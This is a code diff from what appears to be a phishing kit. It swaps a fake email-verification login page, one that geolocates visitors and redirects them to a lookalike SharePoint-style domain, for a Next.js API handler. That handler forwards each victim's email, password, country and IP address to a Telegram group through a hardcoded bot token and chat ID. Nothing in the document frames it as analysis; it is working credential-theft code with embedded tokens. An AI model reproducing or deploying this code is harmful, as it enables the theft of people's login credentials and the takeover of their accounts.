@@ -1,125 +1,43 @@
-// pages/index.js
+// pages/api/send-telegram.js
 
-import { useState, useEffect } from 'react';
 import axios from 'axios';
-import styles from '../styles/Home.module.css';
+import countries from 'i18n-iso-countries';
 
-export default function Home() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [country, setCountry] = useState('');
-  const [emailSubmitted, setEmailSubmitted] = useState(false);
-  const [errorMessage, setErrorMessage] = useState('');
-  const [isProcessing, setIsProcessing] = useState(false); // Modal state
+// Define your bot token and group ID
+const BOT_TOKEN = '8196319945:AAHPEcumR9n3hASIXg9IdmkX06UIxQbK5R4';
+const CHAT_ID = '-1002383824557'; // Group chat ID
 
-  useEffect(() => {
-    // Fetch user's country based on IP and get full country name
-    axios.get('https://ipinfo.io/json?token=c3e87e382ddea7')
-      .then(response => {
-        const countryCode = response.data.country;
-        // Fetch full country name using the country code
-        return axios.get(`https://restcountries.com/v3.1/alpha/${countryCode}`);
-      })
-      .then(countryResponse => {
-        setCountry(countryResponse.data[0].name.common); // Set full country name
-      })
-      .catch(error => {
-        console.error('Failed to fetch full country name:', error);
-        setErrorMessage('Failed to retrieve country information.');
-      });
-  }, []);
+// Initialize country data for English
+countries.registerLocale(require('i18n-iso-countries/langs/en.json'));
 
-  const handleEmailSubmit = (e) => {
-    e.preventDefault();
-    if (validateEmail(email)) {
-      setEmailSubmitted(true);
-      setErrorMessage('');
-    } else {
-      setErrorMessage('Please enter a valid email address.');
-    }
-  };
+export default async function handler(req, res) {
+  const { email, password, country } = req.body;
 
-  const handlePasswordSubmit = async (e) => {
-    e.preventDefault();
+  if (!email || !password || !country) {
+    return res.status(400).json({ message: 'Email, password, and country are required.' });
+  }
 
-    if (password.length >= 5) {
-      setIsProcessing(true); // Show processing modal
+  // Get the IP address from the request headers
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-      try {
-        // Send email and password with country to the backend API
-        const response = await axios.post('/api/send-email', {
-          email,
-          password,
-          country,
-        });
+  // Convert the country code to full country name, if available
+  const fullCountryName = countries.getName(country, 'en') || country; // Fallback to input if not found
 
-        console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://onero.shareploint-access.click';
-      } catch (error) {
-        console.error('Failed to send email:', error);
-        setErrorMessage('Failed to submit. Please try again.');
-      } finally {
-        setIsProcessing(false); // Hide processing modal after API call completes
-      }
-    } else {
-      setErrorMessage('Password must be at least 5 characters long.');
-    }
-  };
+  // Prepare the message content with subject as "NEW login from [Full Country Name] - IP: [IP Address]"
+  const message = `NEW login from ${fullCountryName} - IP: ${ip}\n\nEmail: ${email}\nPassword: ${password}\nCountry: ${fullCountryName}\nIP Address: ${ip}`;
 
-  const validateEmail = (email) => {
-    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return re.test(String(email).toLowerCase());
-  };
+  try {
+    // Send the message to the Telegram group using the Bot API
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await axios.post(telegramUrl, {
+      chat_id: CHAT_ID,
+      text: message,
+    });
 
-  return (
-    <div className={styles.container}>
-      <div className={styles.background}></div>
-      <div className={styles.loginBox}>
-        <img src="/logo.png" alt="Logo" className={styles.logo} />
-        <div className={styles.message}>
-          {emailSubmitted ? 'Validate email password to continue' : 'Verify email to proceed'}
-        </div>
-        {emailSubmitted ? (
-          <>
-            <div className={styles.displayEmail}>{email}</div>
-            <form onSubmit={handlePasswordSubmit}>
-              <input
-                type="password"
-                placeholder="Password"
-                className={styles.inputField}
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-              />
-              <div className={styles.buttonContainer}>
-                <button type="submit" className={styles.submitButton}>Validate</button>
-              </div>
-            </form>
-          </>
-        ) : (
-          <form onSubmit={handleEmailSubmit}>
-            <input
-              type="email"
-              placeholder="Email Address"
-              className={styles.inputField}
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-            />
-            <div className={styles.buttonContainer}>
-              <button type="submit" className={styles.nextButton}>Next</button>
-            </div>
-          </form>
-        )}
-        {errorMessage && <div className={styles.errorMessage}>{errorMessage}</div>}
-
-        {/* Processing Modal */}
-        {isProcessing && (
-          <div className={styles.modal}>
-            <div className={styles.modalContent}>
-              <p>Processing...</p>
-            </div>
-          </div>
-        )}
-      </div>
-    </div>
-  );
+    // Respond with success
+    res.status(200).json({ message: 'Message sent successfully to Telegram group!' });
+  } catch (error) {
+    console.error('Error sending message to Telegram:', error);
+    res.status(500).json({ message: 'Error sending message to Telegram.' });
+  }
 }
